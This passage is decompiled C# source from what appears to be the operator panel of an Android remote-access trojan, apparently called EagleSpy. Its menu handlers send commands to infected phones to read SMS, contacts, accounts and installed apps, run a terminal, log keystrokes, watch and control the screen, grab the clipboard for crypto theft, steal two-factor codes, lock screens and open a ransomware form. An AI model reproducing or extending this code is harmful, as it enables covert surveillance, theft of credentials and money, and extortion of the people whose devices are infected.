										SecurityKey.getContacts,
										Data.SPL_SOCKET,
										"contacts"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000498 RID: 1176 RVA: 0x0005C160 File Offset: 0x0005A360
	private void ShowRegisteredEmailsToolsTrip_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".info",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.Account,
										Data.SPL_SOCKET,
										"account"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000499 RID: 1177 RVA: 0x0005C2EC File Offset: 0x0005A4EC
	private void InstalledApplicationsToolsTrip_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".apps",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.Apps,
										Data.SPL_SOCKET,
										"apps"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600049A RID: 1178 RVA: 0x0005D1FC File Offset: 0x0005B3FC
	private void toolStripMenuItem26_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								string[] array = client.Keys.Split(new char[]
								{
									':'
								});
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2 + Data.SPL_SOCKET + "adm<*>",
										Data.SPL_SOCKET,
										array[0],
										Data.SPL_SOCKET,
										array[1],
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600049B RID: 1179 RVA: 0x0005D7C8 File Offset: 0x0005B9C8
	private void toolStripMenuItem28_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								CallPhone callPhone = new CallPhone();
								callPhone.L0.Text = "add Number";
								callPhone.StartPosition = FormStartPosition.Manual;
								callPhone.Location = Codes.FixSize(Data.MainForm, callPhone);
								if (callPhone.ShowDialog() == DialogResult.OK)
								{
									string text = callPhone.TextBox1.Text;
									string call = callPhone._Call;
									callPhone.Close();
									if (Operators.CompareString(text, null, false) != 0)
									{
										try
										{
											if (client != null)
											{
												object[] parametersObjects = new object[]
												{
													myClient,
													string.Concat(new string[]
													{
														SecurityKey.KeysClient1,
														Data.SPL_SOCKET,
														reso.domen,
														".info",
														Data.SPL_SOCKET,
														"method",
														Data.SPL_SOCKET,
														SecurityKey.resultClient,
														Data.SPL_SOCKET,
														call,
														Data.SPL_DATA,
														"tel:",
														text.Trim()
													}),
													Codes.Encoding().GetBytes("null"),
													client
												};
												client.SendMessage(parametersObjects);
											}
										}
										finally
										{
										}
									}
								}
								else
								{
									callPhone.Close();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600049C RID: 1180 RVA: 0x0005DC40 File Offset: 0x0005BE40
	private void toolStripMenuItem32_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								Dialog1 dialog = new Dialog1();
								dialog.Title = "Enter Messege";
								dialog.ShowDialog();
								if (dialog.DialogResult != DialogResult.OK)
								{
									break;
								}
								string[] array = client.Keys.Split(new char[]
								{
									':'
								});
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"msg:",
										dialog.Mytext.Text,
										Data.SPL_SOCKET,
										array[0],
										Data.SPL_SOCKET,
										array[1],
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600049D RID: 1181 RVA: 0x0005DFFC File Offset: 0x0005C1FC
	private void OpenLinkToolsTrip_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								Dialog1 dialog = new Dialog1();
								dialog.Title = "Enter Link";
								dialog.ShowDialog();
								if (dialog.DialogResult != DialogResult.OK)
								{
									break;
								}
								string[] array = client.Keys.Split(new char[]
								{
									':'
								});
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"lnk<*>",
										reso.ChekLink(dialog.Mytext.Text),
										Data.SPL_SOCKET,
										array[0],
										Data.SPL_SOCKET,
										array[1],
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600049E RID: 1182 RVA: 0x0005E220 File Offset: 0x0005C420
	private void NotificationsReaderToolsTrip_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string name = "Notifications_" + client.ClientAddressIP;
								Eaglepopup eaglepopup = (Eaglepopup)MyProject.Application.OpenForms[name];
								if (eaglepopup == null)
								{
									new Eaglepopup
									{
										Location = this.ClientsWindow.PointToScreen(this.ClientsWindow.GetCellDisplayRectangle(0, dataGridViewRow.Index, false).Location),
										ClassClient = client
									}.Show();
									dataGridViewRow.Cells[8].Value = Codes.BlankImage();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600049F RID: 1183 RVA: 0x0005E77C File Offset: 0x0005C97C
	private void RestartToolsTrip_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									SecurityKey.KeysClient5 + Data.SPL_SOCKET + "10000",
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
								client.Close(myClient);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060004A0 RID: 1184 RVA: 0x0005E97C File Offset: 0x0005CB7C
	private void KillAppsToolsTrip_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"kill<*>x",
										Data.SPL_SOCKET,
										"0",
										Data.SPL_SOCKET,
										"0",
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060004A1 RID: 1185 RVA: 0x0005EB48 File Offset: 0x0005CD48
	private void SelfDestructVirusToolsTrip_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string name = "SelfRemove_" + client.ClientAddressIP;
								SelfRemove selfRemove = (SelfRemove)MyProject.Application.OpenForms[name];
								if (selfRemove == null)
								{
									new SelfRemove
									{
										Classclient = client
									}.Show();
								}
								else
								{
									selfRemove.BringToFront();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060004A2 RID: 1186 RVA: 0x0005EEAC File Offset: 0x0005D0AC
	private void ClienttFolderToolsTrip_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							try
							{
								if (client != null)
								{
									string folderUSER = client.FolderUSER;
									if (!Directory.Exists(folderUSER))
									{
										Directory.CreateDirectory(folderUSER);
									}
									Process.Start(folderUSER);
								}
							}
							catch (Exception)
							{
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060004A3 RID: 1187 RVA: 0x0005F1F8 File Offset: 0x0005D3F8
	private void toolStripMenuItem29_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".terminal",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.getCommand,
										Data.SPL_SOCKET,
										"run"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060004A4 RID: 1188 RVA: 0x0005AEA4 File Offset: 0x000590A4
	private void KeyloggerToolsTrip_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							string name = "Keylogger_" + client.ClientRemoteAddress;
							Keylogger keylogger = (Keylogger)MyProject.Application.OpenForms[name];
							if (client != null && keylogger == null)
							{
								keylogger = new Keylogger();
								keylogger.Name = name;
								keylogger.Title = string.Format("{0} - IP:{1}", "Keylogger", client.ClientAddressIP);
								keylogger.Client = client.myClient;
								keylogger.classClient = client;
								keylogger.DGV0.Columns[3].Width = 48;
								keylogger.DGV0.Columns[3].DisplayIndex = 0;
								keylogger.tmpAddressIP = client.ClientAddressIP;
								keylogger.tmpClientName = client.ClientName;
								keylogger.tmpCountry = client.Country;
								keylogger.tmpFolderUSER = client.FolderUSER;
								client.Keylogg = true;
								keylogger.Show();
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060004A5 RID: 1189 RVA: 0x0005BCAC File Offset: 0x00059EAC
	private void ReadSmssToolsTrip_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".sms",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.getSMS,
										Data.SPL_SOCKET,
										"sms",
										Data.SPL_DATA,
										"content://sms/"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060004A6 RID: 1190 RVA: 0x0005DE60 File Offset: 0x0005C060
	private void CryptoClipperToolsTrip_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".info",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.getClipboard,
										Data.SPL_SOCKET,
										"get",
										Data.SPL_DATA,
										"null"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060004A7 RID: 1191 RVA: 0x00077C98 File Offset: 0x00075E98
	private void Steal2FaCodeToolsTrip_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"goauth<*>X",
										Data.SPL_SOCKET,
										"0",
										Data.SPL_SOCKET,
										"0",
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060004A8 RID: 1192 RVA: 0x00077E64 File Offset: 0x00076064
	private void toolStripMenuItem30_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"sp<*>LK",
										Data.SPL_SOCKET,
										"0",
										Data.SPL_SOCKET,
										"0",
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060004A9 RID: 1193 RVA: 0x00078030 File Offset: 0x00076230
	private void toolStripMenuItem31_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"sp<*>LKeb",
										Data.SPL_SOCKET,
										"0",
										Data.SPL_SOCKET,
										"0",
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060004AA RID: 1194 RVA: 0x0005CE10 File Offset: 0x0005B010
	private void WebviewToolsTrip_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string name = "Web_Browser_" + client.ClientAddressIP;
								WebViewMonitor webViewMonitor = (WebViewMonitor)MyProject.Application.OpenForms[name];
								if (webViewMonitor == null)
								{
									new WebViewMonitor
									{
										Name = name,
										Title = string.Format("{0} - IP:{1}", "Web Browser", client.ClientAddressIP),
										Tag = client.ClientAddressIP,
										Classclient = client
									}.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060004AB RID: 1195 RVA: 0x0005C4F8 File Offset: 0x0005A6F8
	private void LiveScreenControlToolsTrip_Click_1(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string name = "Live_Screen_" + client.ClientRemoteAddress;
								ScreenShoter screenShoter = (ScreenShoter)MyProject.Application.OpenForms[name];
								if (screenShoter == null)
								{
									new ScreenShoter
									{
										Name = name,
										Title = string.Format("{0} - IP:{1}", "Live Screen", client.ClientAddressIP),
										Tag = client.ClientRemoteAddress,
										classClient = client,
										Client = client.myClient,
										DownloadsFolder = client.FolderUSER
									}.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060004AC RID: 1196 RVA: 0x0005CE10 File Offset: 0x0005B010
	private void drakeUIButtonIcon4_Click_1(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string name = "Web_Browser_" + client.ClientAddressIP;
								WebViewMonitor webViewMonitor = (WebViewMonitor)MyProject.Application.OpenForms[name];
								if (webViewMonitor == null)
								{
									new WebViewMonitor
									{
										Name = name,
										Title = string.Format("{0} - IP:{1}", "Web Browser", client.ClientAddressIP),
										Tag = client.ClientAddressIP,
										Classclient = client
									}.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060004AD RID: 1197 RVA: 0x0005C680 File Offset: 0x0005A880
	private void drakeUIButtonIcon17_Click_1(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string name = "Screen_Reader_" + client.ClientRemoteAddress;
								ScreenReader screenReader = (ScreenReader)MyProject.Application.OpenForms[name];
								if (screenReader == null)
								{
									new ScreenReader
									{
										Name = name,
										Title = string.Format("{0} - IP:{1}", "Screen Reader", client.ClientAddressIP),
										Tag = client.ClientRemoteAddress,
										Classclient = client
									}.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060004AE RID: 1198 RVA: 0x00077C98 File Offset: 0x00075E98
	private void drakeUIButtonIcon18_Click_1(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"goauth<*>X",
										Data.SPL_SOCKET,
										"0",
										Data.SPL_SOCKET,
										"0",
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060004AF RID: 1199 RVA: 0x00063414 File Offset: 0x00061614
	private void ransomewareToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string name = "SM_Hunter_" + client.ClientAddressIP;
								Faker faker = (Faker)MyProject.Application.OpenForms[name];
								if (faker == null)
								{
									new Faker
									{
										Name = name,
										Title = string.Format("{0} - IP:{1}", "SM Hunter", client.ClientAddressIP),
										Tag = client.ClientRemoteAddress,
										classClient = client,
										Client = client.myClient,
										DownloadsFolder = client.FolderUSER
									}.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060004B0 RID: 1200 RVA: 0x000781FC File Offset: 0x000763FC
	private void LoadTextBoxValues()
	{
		string baseDirectory = AppDomain.CurrentDomain.BaseDirectory;
		string path = Path.Combine(baseDirectory, "WinMM.Net.dll");
		if (File.Exists(path))
		{
			string[] array = File.ReadAllLines(path);
			if (array.Length >= 3)
			{
				this.AlertButton.Text = array[631];
			}
		}
	}

	// Token: 0x060004B1 RID: 1201 RVA: 0x00002A9D File Offset: 0x00000C9D
	private void LicenseCheckTimer_Tick(object sender, EventArgs e)
	{
		this.LoadTextBoxValues();
		this.Guna2ContextMenuStrip1.Enabled = true;
	}

	// Token: 0x04000438 RID: 1080
	private System.Windows.Forms.Timer licenseCheckTimer;

	// Token: 0x04000439 RID: 1081
	private PerformanceCounter cpuCounter;

	// Token: 0x0400043A RID: 1082
	public string PORTs;

	// Token: 0x0400043B RID: 1083
	public List<Accept> server;

	// Token: 0x0400043C RID: 1084
	private string Myname;

	// Token: 0x0400043D RID: 1085
	public bool Alive;

	// Token: 0x0400043E RID: 1086
	public static bool ISDB = true;

	// Token: 0x0400043F RID: 1087
	public static int MyStatus = 1;

	// Token: 0x04000440 RID: 1088
	private int Mx;

	// Token: 0x04000441 RID: 1089
	private int Min;

	// Token: 0x04000442 RID: 1090
	private int Sw;

	// Token: 0x04000443 RID: 1091
	private int Sh;

	// Token: 0x04000444 RID: 1092
	private bool mov;

	// Token: 0x04000445 RID: 1093
	public string DKF;

	// Token: 0x04000446 RID: 1094
	public string DKD;

	// Token: 0x04000447 RID: 1095
	public Ports PortsManager;

	// Token: 0x04000448 RID: 1096
	public GeoMap GlobalMap;

	// Token: 0x04000449 RID: 1097
	public Dictionary<string, double> Globalvlues;

	// Token: 0x0400044A RID: 1098
	public System.Threading.Timer _timer;

	// Token: 0x0400044B RID: 1099
	public Build B;

	// Token: 0x0400044C RID: 1100
	public BackgroundWorker[] Workers;

	// Token: 0x0400044D RID: 1101
	private object NumWorkers;

	// Token: 0x0400044E RID: 1102
	public clsComputerInfo SCANER;

	// Token: 0x0400044F RID: 1103
	public Win_Users WU;

	// Token: 0x04000450 RID: 1104
	private EagleSpySettinngs CYPHERSETTNGS;

	// Token: 0x04000451 RID: 1105
	private string temptext;

	// Token: 0x04000452 RID: 1106
	private string temptext2;

	// Token: 0x04000453 RID: 1107
	public Jector JC;

	// Token: 0x04000454 RID: 1108
	public bool isactive;

	// Token: 0x04000455 RID: 1109
	private List<DataGridViewRow> searchbefore;

	// Token: 0x04000456 RID: 1110
	public Random ran;

	// Token: 0x04000457 RID: 1111
